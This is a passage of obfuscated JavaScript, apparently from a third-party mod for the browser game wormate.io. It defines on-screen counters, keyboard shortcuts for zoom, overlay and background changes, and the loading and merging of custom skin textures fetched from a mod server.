)|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(_0x2958d0.substring(0, 4))) {
        _0x10b1a7 = true;
      }
    })(navigator.userAgent || navigator.vendor || window.opera);
    return _0x10b1a7;
  }
  window.ctxx = {
    fontStyle: {
      amarelo: new PIXI.TextStyle({
        align: "center",
        fill: "#f8d968",
        fontSize: 10,
        lineJoin: "round",
        stroke: "red",
        strokeThickness: 1,
        whiteSpace: "normal",
        wordWrap: true
      }),
      serversStyle: new PIXI.TextStyle({
        align: "center",
        fill: "#fff009",
        fontSize: 11,
        lineJoin: "round",
        whiteSpace: "normal",
        wordWrap: true
      }),
      amarelo11: new PIXI.TextStyle({
        align: "center",
        fill: "#f8d968",
        fontSize: 10,
        lineJoin: "round",
        stroke: "red",
        strokeThickness: 1,
        whiteSpace: "normal",
        wordWrap: true
      }),
      branco: new PIXI.TextStyle({
        align: "center",
        fill: "#fff",
        fontSize: 10,
        lineJoin: "round",
        stroke: "#FFF",
        whiteSpace: "normal",
        wordWrap: true
      }),
      hsBranco: new PIXI.TextStyle({
        align: "center",
        fill: "#fff",
        fontSize: 10,
        lineJoin: "round",
        stroke: "#FFF",
        whiteSpace: "normal",
        wordWrap: true
      }),
      hsBrancoRight: new PIXI.TextStyle(_0x13f8f6({
        align: "center",
        fill: "#fff",
        fontSize: 12,
        lineJoin: "round",
        stroke: "#FFF",
        whiteSpace: "normal",
        wordWrap: true
      }, "align", "right"))
    }
  };
  var _0x3fdd9b = ["#FFD500", "#FFC75A", "#00B2ED", "#FF4544", "#0094D7", "#CCCF81", "#ff0999"];
  for (var _0x68ef43 = 0; _0x68ef43 < _0x3fdd9b.length; _0x68ef43++) {
    var _0x2d3751 = _0x3fdd9b[_0x68ef43];
    ctxx.fontStyle["tfc" + _0x68ef43] = new PIXI.TextStyle({
      align: "center",
      fill: _0x2d3751,
      fontSize: 25,
      lineJoin: "round",
      stroke: "black",
      strokeThickness: 1,
      whiteSpace: "normal",
      wordWrap: true,
      fontWeight: "bold"
    });
  }
  ctxx.label_hs = new PIXI.Text("HS", ctxx.fontStyle.amarelo);
  ctxx.label_hs.x = 25;
  ctxx.label_hs.y = 107;
  ctxx.label_hs.anchor.x = 0.5;
  ctxx.hs = new PIXI.Text("0", ctxx.fontStyle.amarelo);
  ctxx.hs.x = 25;
  ctxx.hs.y = 120;
  ctxx.hs.anchor.x = 0.5;
  ctxx.hsTotal = new PIXI.Text("0", ctxx.fontStyle.amarelo);
  ctxx.hsTotal.x = 25;
  ctxx.hsTotal.y = 133;
  ctxx.hsTotal.anchor.x = 0.5;
  ctxx.label_kill = new PIXI.Text("KILL", ctxx.fontStyle.branco);
  ctxx.label_kill.x = 75;
  ctxx.label_kill.y = 107;
  ctxx.label_kill.anchor.x = 0.5;
  ctxx.kill = new PIXI.Text("0", ctxx.fontStyle.branco);
  ctxx.kill.x = 75;
  ctxx.kill.y = 120;
  ctxx.kill.anchor.x = 0.5;
  ctxx.killTotal = new PIXI.Text("0", ctxx.fontStyle.branco);
  ctxx.killTotal.x = 75;
  ctxx.killTotal.y = 133;
  ctxx.killTotal.anchor.x = 0.5;
  ctxx.clock = PIXI.Sprite.from(atob(savedImages[8]));
  ctxx.clock.width = 100;
  ctxx.clock.height = 100;
  ctxx.clock.x = -50;
  ctxx.clock.y = -50;
  ctxx.containerCountInfo = new PIXI.Container();
  ctxx.containerCountInfo.x = -45;
  ctxx.containerCountInfo.y = -52;
  ctxx.containerCountInfo.addChild(ctxx.label_hs);
  ctxx.containerCountInfo.addChild(ctxx.hs);
  ctxx.containerCountInfo.addChild(ctxx.hsTotal);
  ctxx.containerCountInfo.addChild(ctxx.label_kill);
  ctxx.containerCountInfo.addChild(ctxx.kill);
  ctxx.containerCountInfo.addChild(ctxx.killTotal);
  ctxx.containerCountInfo.addChild(ctxx.clock);
  ctxx.labelRoom = new PIXI.Text("?", ctxx.fontStyle.serversStyle);
  ctxx.addRoom = function (_0x2861e2) {
    ctxx.labelRoom.text = _0x2861e2 || "?";
  };
  window.addEventListener("keydown", function (_0x42a9ad) {
    if (_0x42a9ad.code == "KeyW") {
      _0x415b17(_0x11c869 ? 0 : 7);
    }
    if (_0x42a9ad.code == "KeyQ") {
      _0x415b17(_0x11c869 ? 0 : 8);
    }
    if (_0x42a9ad.key === "8" && _0x498743.setIntervalRun) {
      _0x19c3f8 = !_0x19c3f8;
    }
    if (_0x42a9ad.code === "KeyB" && _0x498743.setIntervalRun) {
      window.vps.bannedWordsEnabled = !window.vps.bannedWordsEnabled;
      localStorage.setItem("SaveGamewup", JSON.stringify(window.vps));
      setTimeout(_0x39b831, 50);
    }
    if (_0x42a9ad.keyCode === 82 || _0x42a9ad.code === "KeyR") {
      respawnFn();
    }
    if (_0x42a9ad.code === "KeyL") {
      var _0x2f9da5 = _wup._anApp.og.af.ng.mf.getChildByName("lineHS");
      if (_0x2f9da5) {
        vps.laserActive = !vps.laserActive;
        if (vps.laserActive) {
          _0x2f9da5.alpha = vps.laserOpacity || 0.3;
        } else {
          _0x2f9da5.alpha = 0;
        }
      }
    }
    if (_0x42a9ad.key === "5") {
      var _0x4e7f48 = parseInt(vps.background) || 0;
      var _0x38558f = _0x4e7f48 + 1;
      if (_0x38558f >= backgroundArena.length) {
        _0x38558f = 0;
      }
      vps.background = _0x38558f;
      vps.backgroundUri = null;
      _0x3b6ea9.xe._g = _0x498743.bgg(_0x38558f);
      localStorage.setItem("SaveGamewup", JSON.stringify(vps));
      _wup._anApp.og.af.ng.Lg.$g(_0x3b6ea9.xe._g);
      $("#backgroundArena").val(_0x38558f);
      if (typeof updateBackgroundSelection === "function") {
        setTimeout(updateBackgroundSelection, 100);
      }
    }
    if (_0x42a9ad.key === "1") {
      gtr.gtr_skinr();
    }
    if (_0x42a9ad.key === "x1") {
      _wupin.update(1);
    }
    if (_0x42a9ad.key === "x2") {
      _wupin.update(2);
    }
    if ((_0x42a9ad.key === "<" || _0x42a9ad.key === ",") && _0x498743.setIntervalRun) {
      gtr.gtrass1();
    }
    if ((_0x42a9ad.key === ">" || _0x42a9ad.key === ".") && _0x498743.setIntervalRun) {
      gtr.gtrass2();
    }
    if (_0x42a9ad.keyCode === 90 && _0x498743.setIntervalRun) {
      _0x15b497 = vps.configZoom?.closeDown || 1;
    }
    if (_0x42a9ad.keyCode === 67 && _0x498743.setIntervalRun) {
      _0x15b497 = _0x15b497 === 0.5 ? 2 : vps.configZoom?.closeUp || 0.25;
    }
    if (_0x11c869 !== null) {
      if (_0x42a9ad.code !== "KeyQ" && _0x42a9ad.code !== "KeyW") {
        clearInterval(_0x11c869);
        _0x3b6ea9.og.af.ng.Eb.addEventListener("pointermove", gtr.onmovepoint, true);
        _0x11c869 = null;
      }
    }
  });
  var _0x3b6ea9 = {
    Lc: {
      Gb: {}
    }
  };
  window.applyBackgroundFromWindow = function (_0x35c7c6) {
    try {
      if (_0x35c7c6 >= 0 && _0x35c7c6 < window.backgroundArena.length) {
        vps.background = _0x35c7c6;
        vps.backgroundUri = null;
        _0x3b6ea9.xe._g = _0x498743.bgg(_0x35c7c6);
        localStorage.setItem("SaveGamewup", JSON.stringify(vps));
        try {
          if (window._wup && window._wup.anApp && window._wup.anApp.og) {
            _wup.anApp.og.af.ng.Lg.$g(_0x3b6ea9.xe._g);
          }
        } catch (_0x2982d9) {}
        return true;
      }
    } catch (_0x14a71) {
      console.log("Failed to apply background:", _0x14a71);
    }
    return false;
  };
  var _0x498743 = {
    pm: {},
    ps: 0,
    fixTextureUrls: function (_0x2c5613) {
      for (var _0x50df9c in _0x2c5613) {
        if (_0x50df9c.includes("custom_skin_") || _0x50df9c.includes("custom_wear_")) {
          delete _0x2c5613[_0x50df9c].relativePath;
          delete _0x2c5613[_0x50df9c].re1ativePath;
        }
      }
      for (var _0x50df9c in _0x2c5613) {
        var _0x3de004 = _0x2c5613[_0x50df9c];
        if (_0x3de004.url && _0x3de004.url.includes("/wormate.io/")) {
          _0x3de004.url = _0x3de004.url.replace("/wormate.io/", "/resources.wormate.io/");
        }
        if (_0x3de004.relativePath && !_0x3de004.relativePath.startsWith("http")) {
          if (_0x3de004.relativePath.startsWith("/")) {
            _0x3de004.relativePath = "https://resources.wormate.io" + _0x3de004.relativePath;
          } else {
            _0x3de004.relativePath = "https://resources.wormate.io/" + _0x3de004.relativePath;
          }
        }
        if (_0x3de004.custom) {
          delete _0x3de004.relativePath;
          delete _0x3de004.re1ativePath;
          delete _0x3de004.url;
        }
      }
      return _0x2c5613;
    },
    decryptImageData: function (_0x3cad83) {
      if (!_0x3cad83 || typeof _0x3cad83 !== "string") {
        return _0x3cad83;
      }
      var _0x3e2db6 = this.skinSystem.c_v;
      if (_0x3cad83.length > _0x3e2db6) {
        return _0x3cad83.substring(_0x3e2db6) + _0x3cad83.substring(0, _0x3e2db6);
      }
      return _0x3cad83;
    },
    processLocalStorageData: function () {
      var _0x2bf733 = {
        textureDict: {},
        regionDict: {},
        skinArrayDict: [],
        skinGroupArrayDict: []
      };
      try {
        var _0x5805b9 = localStorage.getItem("custom_skin");
        if (_0x5805b9 && _0x5805b9 !== "null") {
          var _0x504c19 = JSON.parse(_0x5805b9);
          var _0x51e3ba = this.processCustomSkinData(_0x504c19);
          this.mergeProcessedData(_0x2bf733, _0x51e3ba);
        }
      } catch (_0x872f86) {
        console.error("Error processing custom skin:", _0x872f86);
      }
      try {
        var _0x5a107f = localStorage.getItem("custom_wear");
        if (_0x5a107f && _0x5a107f !== "null") {
          var _0x594233 = JSON.parse(_0x5a107f);
          var _0x1a131d = this.processCustomWearData(_0x594233);
          this.mergeProcessedData(_0x2bf733, _0x1a131d);
        }
      } catch (_0x4eb28c) {
        console.error("Error processing custom wear:", _0x4eb28c);
      }
      return _0x2bf733;
    },
    processCustomSkinData: function (_0x2ee0f3) {
      var _0x509daf = {
        textureDict: {},
        regionDict: {},
        skinArrayDict: [],
        skinGroupArrayDict: []
      };
      try {
        if (_0x2ee0f3.csg) {
          this.processAnimatedGifSkins(_0x2ee0f3.csg, _0x509daf);
        } else {
          this.processRegularCustomSkins(_0x2ee0f3, _0x509daf);
        }
      } catch (_0x259e17) {
        console.error("Error in processCustomSkinData:", _0x259e17);
      }
      return _0x509daf;
    },
    processRegularCustomSkins: function (_0x56f4cf, _0x3b9bd2) {
      var _0x3ac794 = [];
      for (var _0x4fd68c in _0x56f4cf) {
        if (_0x4fd68c !== "img") {
          try {
            var _0x37b921 = _0x56f4cf[_0x4fd68c];
            if (_0x37b921 && _0x37b921.textureDict && _0x37b921.textureDict[_0x4fd68c]) {
              var _0x30e5dd = _0x37b921.textureDict[_0x4fd68c].file;
              if (_0x30e5dd && _0x30e5dd.search("data:image/png;base64,") === -1) {
                var _0x4b38c8 = this.decryptImageData(_0x30e5dd);
                _0x37b921.textureDict[_0x4fd68c].file = "data:image/png;base64," + _0x4b38c8;
              }
              _0x3b9bd2.textureDict[_0x4fd68c] = _0x37b921.textureDict[_0x4fd68c];
              if (_0x37b921.regionDict) {
                for (var _0x557685 in _0x37b921.regionDict) {
                  _0x3b9bd2.regionDict[_0x557685] = _0x37b921.regionDict[_0x557685];
                }
              }
              if (_0x37b921.skin) {
                _0x3b9bd2.skinArrayDict.push(_0x37b921.skin);
                _0x3ac794.push(_0x37b921.skin.id);
              }
            }
          } catch (_0x17a978) {
            console.error("Error processing skin:", _0x4fd68c, _0x17a978);
          }
        }
      }
      if (_0x3ac794.length > 0) {
        _0x3b9bd2.skinGroupArrayDict.push({
          isCustom: true,
          id: "customer",
          img: atob(savedImages[33]),
          name: {
            de: "Customer",
            en: "Customer",
            es: "Customer",
            fr: "Customer",
            uk: "Customer"
          },
          list: _0x3ac794
        });
      }
    },
    processCustomWearData: function (_0x57287f) {
      var _0x43eab3 = {
        textureDict: {},
        regionDict: {},
        eyesDict: {},
        mouthDict: {},
        hatDict: {},
        glassesDict: {}
      };
      try {
        if (_0x57287f.wear) {
          for (var _0x331a1a in _0x57287f.wear.textureDict) {
            var _0xc5dc48 = _0x57287f.wear.textureDict[_0x331a1a];
            if (_0xc5dc48.file && _0xc5dc48.file.search("data:image/png;base64,") === -1) {
              _0xc5dc48.file = "data:image/png;base64," + this.decryptImageData(_0xc5dc48.file);
            }
            _0x43eab3.textureDict[_0x331a1a] = _0xc5dc48;
          }
          for (var _0x293973 in _0x57287f.wear.regionDict) {
            var _0x3c2205 = _0x57287f.wear.regionDict[_0x293973];
            _0x43eab3.regionDict[_0x293973] = _0x3c2205;
          }
        }
      } catch (_0x15b0b9) {
        console.error("Error processing custom wear:", _0x15b0b9);
      }
      return _0x43eab3;
    },
    mergeAllSkinData: function (_0x14476e, _0x4d1f57, _0xf483c0) {
      try {
        var _0x44ee47 = JSON.parse(JSON.stringify(_0x14476e));
        _0x44ee47.textureDict = this.fixTextureUrls(_0x44ee47.textureDict);
        this.mergeServerData(_0x44ee47, _0x4d1f57);
        this.mergeProcessedData(_0x44ee47, _0xf483c0);
        return _0x44ee47;
      } catch (_0x5536a7) {
        console.error("Error in mergeAllSkinData:", _0x5536a7);
        return _0x14476e;
      }
    },
    mergeServerData: function (_0x423485, _0x1cfdfb) {
      if (!_0x1cfdfb) {
        console.warn("No custom data provided - using fallback");
        return;
      }
      try {
        var _0x348186 = {
          texturesProcessed: 0,
          regionsProcessed: 0,
          eyesProcessed: 0,
          mouthProcessed: 0,
          hatProcessed: 0,
          glassesProcessed: 0,
          skinsProcessed: 0,
          errors: []
        };
        if (_0x1cfdfb.textureDict) {
          for (var _0x15843d in _0x1cfdfb.textureDict) {
            try {
              var _0x12d20c = _0x1cfdfb.textureDict[_0x15843d];
              if (_0x12d20c.file) {
                if (!_0x12d20c.file.startsWith("data:image/")) {
                  _0x12d20c.file = "data:image/png;base64," + _0x12d20c.file;
                }
                _0x12d20c.custom = false;
                _0x12d20c.h1 = true;
                _0x12d20c.h4 = true;
                delete _0x12d20c.relativePath;
                delete _0x12d20c.re1ativePath;
              }
              _0x423485.textureDict[_0x15843d] = _0x12d20c;
              _0x348186.texturesProcessed++;
            } catch (_0x495af1) {
              console.error("Error processing texture:", _0x15843d, _0x495af1);
              _0x348186.errors.push("Texture " + _0x15843d + ": " + _0x495af1.message);
            }
          }
        }
        if (_0x1cfdfb.regionDict) {
          for (var _0x5a386d in _0x1cfdfb.regionDict) {
            try {
              var _0x22c2e3 = _0x1cfdfb.regionDict[_0x5a386d];
              if (_0x22c2e3.texture && !_0x423485.textureDict[_0x22c2e3.texture]) {
                console.warn("Region references missing texture:", _0x5a386d, _0x22c2e3.texture);
                _0x348186.errors.push("Region " + _0x5a386d + " references missing texture: " + _0x22c2e3.texture);
                continue;
              }
              _0x423485.regionDict[_0x5a386d] = _0x22c2e3;
              _0x348186.regionsProcessed++;
            } catch (_0x2968df) {
              console.error("Error processing region:", _0x5a386d, _0x2968df);
              _0x348186.errors.push("Region " + _0x5a386d + ": " + _0x2968df.message);
            }
          }
        }
        var _0x2683dc = [{
          type: "eyesDict",
          variantArray: "eyesVariantArray",
          label: "العيون"
        }, {
          type: "mouthDict",
          variantArray: "mouthVariantArray",
          label: "الأفواه"
        }, {
          type: "hatDict",
          variantArray: "hatVariantArray",
          label: "القبعات"
        }, {
          type: "glassesDict",
          variantArray: "glassesVariantArray",
          label: "النظارات"
        }];
        _0x2683dc.forEach(function (_0x107dcf) {
          var _0x5cd78b = _0x107dcf.type;
          var _0x4a6122 = _0x107dcf.variantArray;
          var _0x5137c1 = _0x107dcf.label;
          if (_0x1cfdfb[_0x5cd78b]) {
            if (!_0x423485[_0x5cd78b]) {
              _0x423485[_0x5cd78b] = {};
            }
            for (var _0x298095 in _0x1cfdfb[_0x5cd78b]) {
              try {
                var _0xef65b6 = _0x1cfdfb[_0x5cd78b][_0x298095];
                if (!_0xef65b6.base || !Array.isArray(_0xef65b6.base)) {
                  console.warn("Invalid wear item structure:", _0x298095);
                  _0x348186.errors.push(_0x5137c1 + " " + _0x298095 + ": Invalid structure");
                  continue;
                }
                var _0x404be9 = [];
                _0xef65b6.base.forEach(function (_0x35bb29) {
                  var _0x4ddc22 = _0x35bb29.region || _0x35bb29;
                  if (!_0x423485.regionDict[_0x4ddc22]) {
                    _0x404be9.push(_0x4ddc22);
                  }
                });
                if (_0x404be9.length > 0) {
                  console.warn(_0x5137c1 + " " + _0x298095 + " has missing regions:", _0x404be9);
                  _0x348186.errors.push(_0x5137c1 + " " + _0x298095 + ": Missing regions: " + _0x404be9.join(", "));
                  continue;
                }
                _0xef65b6.custom = true;
                _0xef65b6.guest = true;
                _0xef65b6.nonbuyable = true;
                if (!_0xef65b6.hasOwnProperty("price")) {
                  _0xef65b6.price = 0;
                }
                _0x423485[_0x5cd78b][_0x298095] = _0xef65b6;
                switch (_0x5cd78b) {
                  case "eyesDict":
                    _0x348186.eyesProcessed++;
                    break;
                  case "mouthDict":
                    _0x348186.mouthProcessed++;
                    break;
                  case "hatDict":
                    _0x348186.hatProcessed++;
                    break;
                  case "glassesDict":
                    _0x348186.glassesProcessed++;
                    break;
                }
              } catch (_0x48691b) {
                console.error("Error processing " + _0x5137c1 + " item:", _0x298095, _0x48691b);
                _0x348186.errors.push(_0x5137c1 + " " + _0x298095 + ": " + _0x48691b.message);
              }
            }
            if (!_0x423485[_0x4a6122]) {
              _0x423485[_0x4a6122] = [];
            }
            var _0xb3d2d8 = new Set();
            _0x423485[_0x4a6122].forEach(function (_0x5b6049) {
              if (Array.isArray(_0x5b6049) && _0x5b6049.length > 0) {
                _0xb3d2d8.add(_0x5b6049[0]);
              }
            });
            if (_0x1cfdfb[_0x4a6122] && Array.isArray(_0x1cfdfb[_0x4a6122])) {
              _0x423485[_0x4a6122] = _0x423485[_0x4a6122].concat(_0x1cfdfb[_0x4a6122]);
            } else {
              Object.keys(_0x1cfdfb[_0x5cd78b]).forEach(function (_0x46a676) {
                if (!_0xb3d2d8.has(_0x46a676)) {
                  _0x423485[_0x4a6122].push([parseInt(_0x46a676)]);
                }
              });
            }
          } else {}
        });
        if (_0x1cfdfb.skinArrayDict && Array.isArray(_0x1cfdfb.skinArrayDict)) {
          _0x1cfdfb.skinArrayDict.forEach(function (_0x5086e5, _0x1e66c1) {
            try {
              if (!_0x5086e5.id || !_0x5086e5.base || !Array.isArray(_0x5086e5.base)) {
                console.warn("Invalid skin structure at index:", _0x1e66c1);
                _0x348186.errors.push("Skin at index " + _0x1e66c1 + ": Invalid structure");
                return;
              }
              var _0x3a088e = [];
              _0x5086e5.base.forEach(function (_0x1237bd) {
                if (!_0x423485.regionDict[_0x1237bd]) {
                  _0x3a088e.push(_0x1237bd);
                }
              });
              if (_0x3a088e.length > 0) {
                console.warn("Skin " + _0x5086e5.id + " has missing regions:", _0x3a088e);
                _0x348186.errors.push("Skin " + _0x5086e5.id + ": Missing regions: " + _0x3a088e.join(", "));
                return;
              }
              _0x5086e5.custom = true;
              _0x5086e5.guest = true;
              _0x5086e5.nonbuyable = true;
              if (!_0x5086e5.hasOwnProperty("price")) {
                _0x5086e5.price = 0;
              }
              _0x423485.skinArrayDict.push(_0x5086e5);
              _0x348186.skinsProcessed++;
            } catch (_0x25f47d) {
              console.error("Error processing skin at index:", _0x1e66c1, _0x25f47d);
              _0x348186.errors.push("Skin at index " + _0x1e66c1 + ": " + _0x25f47d.message);
            }
          });
        }
        if (_0x1cfdfb.skinGroupArrayDict && Array.isArray(_0x1cfdfb.skinGroupArrayDict)) {
          if (!_0x423485.skinGroupArrayDict) {
            _0x423485.skinGroupArrayDict = [];
          }
          _0x1cfdfb.skinGroupArrayDict.forEach(function (_0x5a2eb6, _0x5c9295) {
            try {
              if (!_0x5a2eb6.id || !_0x5a2eb6.list || !Array.isArray(_0x5a2eb6.list)) {
                console.warn("Invalid skin group structure at index:", _0x5c9295);
                _0x348186.errors.push("Skin group at index " + _0x5c9295 + ": Invalid structure");
                return;
              }
              if (!_0x5a2eb6.name) {
                _0x5a2eb6.name = {
                  en: "Custom Group " + _0x5a2eb6.id,
                  ar: "مجموعة مخصصة " + _0x5a2eb6.id
                };
              }
              _0x423485.skinGroupArrayDict.push(_0x5a2eb6);
            } catch (_0x32176b) {
              _0x348186.errors.push("Skin group at index " + _0x5c9295 + ": " + _0x32176b.message);
            }
          });
        }
        if (_0x348186.errors.length > 0) {
          console.warn("Processing errors encountered:", _0x348186.errors.length);
          _0x348186.errors.forEach(function (_0x4c825c, _0x4dcf6d) {
            console.warn("Error " + (_0x4dcf6d + 1) + ":", _0x4c825c);
          });
        }
      } catch (_0x4dfdca) {
        console.error("Critical error in mergeServerData:", _0x4dfdca);
        console.error("Stack trace:", _0x4dfdca.stack);
        try {
          if (_0x1cfdfb.textureDict) {
            Object.assign(_0x423485.textureDict, _0x1cfdfb.textureDict);
          }
          if (_0x1cfdfb.regionDict) {
            Object.assign(_0x423485.regionDict, _0x1cfdfb.regionDict);
          }
          console.log("Applied basic fallback merge");
        } catch (_0x1b9fb2) {
          console.error("Even fallback merge failed:", _0x1b9fb2);
        }
      }
    },
    mergeProcessedData: function (_0x43f928, _0x5470a7) {
      if (!_0x5470a7) {
        return;
      }
      try {
        if (_0x5470a7.textureDict) {
          Object.assign(_0x43f928.textureDict, _0x5470a7.textureDict);
        }
        if (_0x5470a7.regionDict) {
          Object.assign(_0x43f928.regionDict, _0x5470a7.regionDict);
        }
        if (_0x5470a7.skinArrayDict && Array.isArray(_0x5470a7.skinArrayDict)) {
          _0x43f928.skinArrayDict = _0x43f928.skinArrayDict.concat(_0x5470a7.skinArrayDict);
        }
        if (_0x5470a7.skinGroupArrayDict && Array.isArray(_0x5470a7.skinGroupArrayDict)) {
          if (!_0x43f928.skinGroupArrayDict) {
            _0x43f928.skinGroupArrayDict = [];
          }
          _0x43f928.skinGroupArrayDict = _0x43f928.skinGroupArrayDict.concat(_0x5470a7.skinGroupArrayDict);
        }
      } catch (_0x372863) {
        console.error("Error in mergeProcessedData:", _0x372863);
      }
    },
    registry: function () {
      var _0x4af3e5 = _0x8f1d97(_0x22e5a4().mark(function _0x3eebe3(_0x3933f0) {
        var _0x3878d3;
        var _0x28b379;
        var _0x49c879;
        return _0x22e5a4().wrap(function _0x1270d0(_0x7e3d42) {
          while (1) {
            switch (_0x7e3d42.prev = _0x7e3d42.next) {
              case 0:
                _0x7e3d42.prev = 0;
                _0x7e3d42.next = 3;
                return Promise.resolve(_0x3933f0 || {
                  textureDict: {},
                  regionDict: {},
                  skinArrayDict: [],
                  eyesDict: {},
                  mouthDict: {},
                  hatDict: {},
                  glassesDict: {}
                });
              case 3:
                _0x3878d3 = _0x7e3d42.sent;
                _0x7e3d42.next = 6;
                return fetch(window.vps.s_l + "/store", {
                  headers: {
                    "Content-Type": "application/json"
                  },
                  method: "POST",
                  body: JSON.stringify({
                    country: localStorage.getItem("oco") || "gb",
                    v: "v2",
                    action: "get_textures"
                  })
                }).then(function (_0xe81fe3) {
                  if (!_0xe81fe3.ok) {
                    throw new Error("Custom data fetch failed: " + _0xe81fe3.status);
                  }
                  return _0xe81fe3.json();
                }).then(function (_0x5eb193) {
                  return _0x5eb193;
                }).catch(function (_0x4d8053) {
                  console.warn("Failed to fetch custom textures:", _0x4d8053);
                  return {
                    textureDict: {},
                    regionDict: {},
                    skinArrayDict: []
                  };
                });
              case 6:
                _0x28b379 = _0x7e3d42.sent;
                _0x49c879 = _0x498743.processLocalStorageData();
                _0x3878d3 = _0x498743.mergeAllSkinData(_0x3878d3, _0x28b379, _0x49c879);
                return _0x7e3d42.abrupt("return", _0x3878d3);
              case 11:
                _0x7e3d42.prev = 11;
                _0x7e3d42.t0 = _0x7e3d42.catch(0);
                console.error("Registry error:", _0x7e3d42.t0);
                return _0x7e3d42.abrupt("return", _0x3933f0 || {
                  textureDict: {},
                  regionDict: {},
                  skinArrayDict: []
                });
              case 15:
              case "end":
                return _0x7e3d42.stop();
            }
          }
        }, _0x3eebe3, null, [[0, 11]]);
      }));
      function _0x3080d4(_0x2d18ec) {
        return _0x4af3e5.apply(this, arguments);
      }
      return _0x3080d4;
    }(),
    ps3: function _0x139c5b() {
      _0x3b6ea9.dh.xq(_0x3b6ea9.og.af.Gn(), _0x3b6ea9.og.af.Hn());
    },
    setIntervalRun: null,
    loadBg: false,
    LG: function _0xd1d412(_0x3b57c4, _0x1ea14e, _0x7b341a) {
      _0x3b57c4.Ll("gg", _0x7b341a.credential, null);
    },
    Lg: function _0x80243b(_0x571552) {
      _0x3b6ea9.xe._g = _0x498743.bgg(vps.background || 0);
      _wup.$C = _0x571552;
      _wup.$W = _0x498743;
      if (vps.bgGameWidth > 512) {
        return new _0x571552.WMGBS1();
      } else {
        return new _0x571552.WMGBS2();
      }
    }
  };
  window.gameManager = _0x498743;
  _0x498743.Vd = function (_0x297daa, _0x3206e2) {
    _wup.customConfig(_0x297daa);
    if (!_0x297daa) {
      return;
    }
    var _0x188867 = this;
    function _0x13f848(_0x3a58e9) {
      var _0x4032f5 = _0x3206e2.Id.Ld;
      _0x188867.Rd(_0x4032f5, _0x3206e2.Od.bc(_0x4032f5).lc(_0x3a58e9));
    }
    if (this.Fd) {
      this.Pd();
      return;
    }
    var _0x30c190 = [];
    var _0x4fd7f1 = [];
    var _0x363882 = 0;
    var _0x1c6a62 = new PIXI.Loader();
    for (var _0x5e9906 in _0x297daa.textureDict) {
      if (_0x297daa.textureDict.hasOwnProperty(_0x5e9906)) {
        var _0xc90fbc = _0x297daa.textureDict[_0x5e9906];
        if (_0xc90fbc.custom) {
          let _0x813e19 = null;
          if (_0xc90fbc.file && _0xc90fbc.file.startsWith("data:image/")) {
            _0x813e19 = _0xc90fbc.file;
          } else if (_0xc90fbc.relativePath) {
            if (_0xc90fbc.relativePath.startsWith("http") || _0xc90fbc.relativePath.startsWith("data:image/")) {
              _0x813e19 = _0xc90fbc.relativePath;
            } else {
              _0x813e19 = "" + window.vps.s_l + _0xc90fbc.relativePath;
            }
          } else if (_0xc90fbc.file) {
            if (_0xc90fbc.file.startsWith("data:image/")) {
              _0x813e19 = _0xc90fbc.file;
            } else {
              _0x813e19 = "data:image/png;base64," + _0xc90fbc.file;
            }
          } else if (_0xc90fbc.re1ativePath) {
            if (_0xc90fbc.re1ativePath.startsWith("http") || _0xc90fbc.re1ativePath.startsWith("data:image/")) {
              _0x813e19 = _0xc90fbc.re1ativePath;
            } else {
              _0x813e19 = "" + window.vps.s_l + _0xc90fbc.re1ativePath;
            }
          }
          if (_0x813e19) {
            var _0x2ea123 = {
              ae: _0x5e9906,
              custom: true,
              textureUrl: _0x813e19,
              resource: null
            };
            _0x30c190.push(_0x2ea123);
            if (_0x813e19.startsWith("http")) {
              _0x1c6a62.add(_0x5e9906, _0x813e19, {
                crossOrigin: "anonymous",
                timeout: 16000,
                loadType: 2
              });
            } else if (_0x813e19.startsWith("data:image/")) {
              const _0x3b29ee = PIXI.Texture.from(_0x813e19);
              _0x2ea123.resource = {
                texture: _0x3b29ee
              };
            }
          }
          continue;
        }
        var _0x400c89 = _0xc90fbc.re1ativePath || _0xc90fbc.relativePath;
        var _0xe5d509 = _0xc90fbc.fileSize || 100;
        var _0x29e2b0 = _0xc90fbc.sha256 || null;
        if (_0x400c89) {
          let _0x350124 = _0x400c89;
          if (!_0x350124.startsWith("http")) {
            _0x350124 = "https://resources.wormate.io/dynamic/assets/" + _0x350124;
          }
          var _0x4faf2f = new _0x3206e2.Wd(_0x5e9906, _0x350124, _0xe5d509, _0x29e2b0);
          _0x4faf2f.h1 = _0xc90fbc.h1;
          _0x4faf2f.h4 = _0xc90fbc.h4;
          _0x4faf2f.skinEvo = _0xc90fbc.skinEvo;
          _0x4faf2f.lines = _0xc90fbc.lines;
          _0x4faf2f.speed = _0xc90fbc.speed;
          _0x30c190.push(_0x4faf2f);
          _0x1c6a62.add(_0x5e9906, _0x350124);
        }
      }
    }
    _0x1c6a62.onProgress.add(function (_0xf2f915, _0x30230c) {
      _0x13f848(_0xf2f915.progress / 100);
    });
    _0x1c6a62.load(function (_0x38983b, _0x361c2e) {
      _0x30c190.forEach(function (_0x3549a9) {
        _0x3549a9.resource = _0x361c2e[_0x3549a9.ae];
      });
      _0x188867.$d(_0x297daa, _0x30c190, _0x3206e2);
    });
    return;
  };
  _0x498743.Zd = function (_0x304914, _0x4b5a15, _0x583147, _0x2d5dc3) {
    $.ajax({
      type: "GET",
      url: _0x304914._d,
      xhrFields: {
        responseType: "arraybuffer",
        onprogress: function _0xc3825a(_0x5c8983) {
          if (_0x5c8983.lengthComputable) {
